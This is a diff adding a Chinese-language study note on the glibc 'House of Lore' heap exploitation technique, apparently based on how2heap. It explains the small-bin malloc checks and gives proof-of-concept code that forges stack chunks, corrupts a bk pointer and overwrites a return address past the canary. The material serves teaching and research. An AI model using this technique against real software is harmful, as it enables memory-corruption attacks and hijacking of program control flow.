@@ -716,3 +716,226 @@ DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD
 - [Poison null byte from Ret2Forever](https://tac1t0rnx.space/2018/01/24/poison-null-byte/)
 - [Heap Exploitation: Off-By-One / Poison Null Byte](https://devel0pment.de/?p=688)
 - [Null Byte Poisoning - The Magic Byte](https://0x00sec.org/t/null-byte-poisoning-the-magic-byte/3874)
+
+### House of Lore
+
+学heap，还是要很清晰chunk在malloc和free之后会放到哪个bin，以及malloc和free会触发哪些合并和chunk移动。
+
+#### malloc chunk in range of small bin
+
+如果在 malloc 的时候，申请的内存块在 small bin 范围内，那么执行的流程如下：
+
+```c++
+    /*
+       If a small request, check regular bin.  Since these "smallbins"
+       hold one size each, no searching within bins is necessary.
+       (For a large request, we need to wait until unsorted chunks are
+       processed to find best fit. But for small ones, fits are exact
+       anyway, so we can check now, which is faster.)
+     */
+    if (in_smallbin_range(nb)) {
+        // 获取 small bin 的索引
+        idx = smallbin_index(nb);
+        // 获取对应 small bin 中的 chunk 指针
+        bin = bin_at(av, idx);
+        // 先执行 victim= last(bin)，获取 small bin 的最后一个 chunk
+        // 如果 victim = bin ，那说明该 bin 为空。
+        // 如果不相等，那么会有两种情况
+        if ((victim = last(bin)) != bin) { //victim是当前处于空闲，但即将分配出去的chunk
+            // 第一种情况，small bin 还没有初始化。
+            if (victim == 0) /* initialization check */
+                // 执行初始化，将 fast bins 中的 chunk 进行合并
+                malloc_consolidate(av);
+            // 第二种情况，small bin 中存在空闲的 chunk
+            else {
+                // 获取 small bin 中倒数第二个 chunk 。
+                bck = victim->bk;
+                // 检查 bck->fd 是不是 victim，防止伪造
+                if (__glibc_unlikely(bck->fd != victim)) {
+                    errstr = "malloc(): smallbin double linked list corrupted";
+                    goto errout;
+                }
+                // 设置 victim 对应的 inuse 位
+                set_inuse_bit_at_offset(victim, nb);
+                // 修改 small bin 链表，将 small bin 的最后一个 chunk 取出来
+                bin->bk = bck;
+                bck->fd = bin;
+                // 如果不是 main_arena，设置对应的标志
+                if (av != &main_arena) set_non_main_arena(victim);
+                // 细致的检查
+                check_malloced_chunk(av, victim, nb);
+                // 将申请到的 chunk 转化为对应的 mem 状态【返回chunk的用户指针给用户】
+                void *p = chunk2mem(victim);
+                // 如果设置了 perturb_type , 则将获取到的chunk初始化为 perturb_type ^ 0xff
+                alloc_perturb(p, bytes);
+                return p;
+            }
+        }
+    }
+```
+
+如果small bin 中有空闲的chunk，那么就会进入以下部分【从上面的code中摘取的】：
+
+```c++
+                // 获取 small bin 中倒数第二个 chunk 。
+                bck = victim->bk;
+                // 检查 bck->fd 是不是 victim，防止伪造
+                if (__glibc_unlikely(bck->fd != victim)) {
+                    errstr = "malloc(): smallbin double linked list corrupted";
+                    goto errout;
+                }
+                // 设置 victim 对应的 inuse 位
+                set_inuse_bit_at_offset(victim, nb);
+                // 修改 small bin 链表，将 small bin 的最后一个 chunk 取出来
+                bin->bk = bck;
+                bck->fd = bin;
+```
+
+我们可以分析出，如果我们可以修改 small bin 的最后一个 chunk 的 bk 为我们指定内存地址的 fake chunk【在两次malloc之后这个伪造在内存指定位置的chunk就会被分配】，并且同时满足`bck->fd != victim`的检测，那么我们就可以在一次malloc后，使得 small bin 的 bk 恰好为我们构造的 fake chunk。也就是说，当下一次申请 small bin 的时候，我们就会分配到指定位置的 fake chunk。
+
+![攻击伪造图](/img/how2heap/houseofl.png)
+
+#### 攻击原理
+
+首先在栈上分配两个数组用于伪造chunk。
+
+```c++
+intptr_t* stack_buffer_1[4] = {0};  
+intptr_t* stack_buffer_2[3] = {0};
+```
+
+分配好victim chunk，获取该chunk的chunk头指针`intptr_t* victim_chunk`
+
+```c++
+victim = malloc(100)
+intptr_t* victim_chunk = victim-2;
+```
+
+这是heap上的第一个small chunk【free后，其则是对应index的small bin下的最后一个free small chunk，也是第一个free small chunk，下一次malloc small bin就会分配他】。
+
+然后在栈上制造一个fake chunk，并且要保证绕过malloc small bin时的检测。
+
+```c++
+//在栈上创建一个fake chunk，为了避免malloc small bin时
+  fprintf(stderr, "Set the fwd pointer to the victim_chunk in order to bypass the check of small bin corrupted in second to the last malloc, which putting stack address on smallbin list\n");
+  stack_buffer_1[0] = 0;
+  stack_buffer_1[1] = 0;
+  stack_buffer_1[2] = victim_chunk;
+
+  fprintf(stderr, "Set the bk pointer to stack_buffer_2 and set the fwd pointer of stack_buffer_2 to point to stack_buffer_1 "
+         "in order to bypass the check of small bin corrupted in last malloc, which returning pointer to the fake "
+         "chunk on stack");
+  stack_buffer_1[3] = (intptr_t*)stack_buffer_2;
+  stack_buffer_2[2] = (intptr_t*)stack_buffer_1;
+```
+
+以上操作的结果是：
+
+![stack的状态如下](/img/how2heap/houseofl1.png)
+
+然后申请一块大内存，来防止等一下free的时候把我们精心构造好的victim chunk给合并了【将victim chunk和top chunk隔离开】。
+
+```c++
+void *p5 = malloc(1000);
+```
+
+现在把victim chunk给free掉，之后它会被放入unsortedbin中。
+
+```c++
+free((void*)victim);
+```
+
+放入unsortedbin之后victim chunk的fd和bk会同时指向unsortedbin的头部。
+
+<u>现在执行一个不能被unsortedbin和smallbin响应的malloc。</u>
+
+```c++
+void *p2 = malloc(1200);
+```
+
+<u>malloc之后victim chunk将会从unsortedbin转移到smallbin中</u>【会进行unsorted bin的整合，整合到small bin或large bin中】。
+
+同时victim chunk的fd和bk也会更新，改为指向smallbin的头部。
+
+现在假设在free 的chunk中发生了**溢出改写了victim的bk指针**
+
+```c
+victim[1] = (intptr_t)stack_buffer_1; 
+// victim->bk is pointing to stack
+```
+
+![](/img/how2heap/houseofl2.png)
+
+现在开始malloc和victim大小相同的内存块。
+
+```c++
+p3 = malloc(100);
+```
+
+返回给p3地址就是原来的victim地址，而且此时前面伪造的fake chunk也被连接到了smallbin上。
+
+##### 思考绕过检查的原理
+
+当分配一个small bin时，会执行以下code：
+
+```c++
+// 获取 small bin 中倒数第二个 chunk 。
+bck = victim->bk; //也就得到bck = stack_buffer_1
+
+// 检查 bck->fd 是不是 victim，防止伪造
+//bck->fd = stack_buffer_1->fd = victim从而绕过检查
+if (__glibc_unlikely(bck->fd != victim)) {
+	errstr = "malloc(): smallbin double linked list corrupted";
+	goto errout;
+}
+// 设置 victim 对应的 inuse 位
+set_inuse_bit_at_offset(victim, nb);
+// 修改 small bin 链表，将 small bin 的最后一个 chunk 取出来
+bin->bk = bck; //此时small bin头的bk接上栈上的伪造chunk,即stack_buffer_1
+bck->fd = bin; //stack_buffer_1的fd指向small bin
+```
+
+从而在绕过检查的同时，将chunk链接到栈上。
+
+回到攻击代码，再次malloc
+
+```c++
+p4 = malloc(100);
+```
+
+这次返回的p4就将是一个栈地址！
+
+**需要注意的是**在pwndbg中`bin`是通过fd和bk链接显示的，由于small bin头的bk和victim的fd一直是相互指向的，因此无法在debug的时候显示看出存在伪造的栈chunk。
+
+<u>这个技术最重要的地方在于成功将victim chunk和两个fake chunk构造成双向链表。</u>
+
+##### 攻击进行
+
+由于p4得到了stack_buffer_1位置的伪造chunk，因此可以对栈上进行操作，比如将返回地址`p4+40`的位置，修改为某函数的地址。这不仅仅绕过了canary，还成功改变了程序流。
+
+```c++
+//可执行的攻击方式
+intptr_t sc = (intptr_t)jackpot; // Emulating our in-memory shellcode
+memcpy((p4+40), &sc, 8); // This bypasses stack-smash detection since it jumps over the canary
+```
+
+##### 补充
+
+```
+可以对源码进行改动，将分配的大小改成0x80
+```
+
+**原来的代码中victim chunk的大小是100，malloc之后会对齐到0x70。**
+
+0x70在32位系统上属于smallbin，在64位系统上属于fastbin【这样就不变观察】。
+
+原本针对32位程序的代码编译为64位程序也能正常运行，这是为什么？
+
+这是因为，不管这个0x70大小的victim chunk是先加入unsotedbin还是fastbin，在之后都会被加入到smallbin中，smallbin也有0x70大小的链表！
+
+但是改成0x80，会直接放在small bin，故更加直观。
+
+#### 参考链接
+
+- [CTF wiki——house of lore](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/house_of_lore-zh/)
+- [安全客 how2heap](https://www.anquanke.com/post/id/86809)
